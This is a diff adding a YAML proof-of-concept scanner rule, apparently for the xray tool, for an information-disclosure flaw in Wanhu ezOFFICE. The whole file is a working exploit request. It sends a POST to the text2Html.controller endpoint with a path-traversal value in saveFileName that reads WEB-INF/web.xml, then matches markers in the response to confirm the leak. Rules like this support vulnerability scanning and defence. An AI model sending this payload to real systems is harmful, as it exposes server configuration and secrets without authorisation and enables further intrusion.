@@ -1,0 +1,18 @@
+name: poc-yaml-http-wanhu-ezoffice-text2Html-info-leak
+transport: http
+
+rules:
+  r1:
+    request:
+      method: POST
+      cache: true
+      follow_redirects: false
+      path: /defaultroot/convertFile/text2Html.controller
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+    expression: response.status == 200 && response.body.bcontains(bytes("web-app")) && response.body.bcontains(bytes("servlet-class"))
+expression: r1()
+detail:
+  author: DawnT0wn
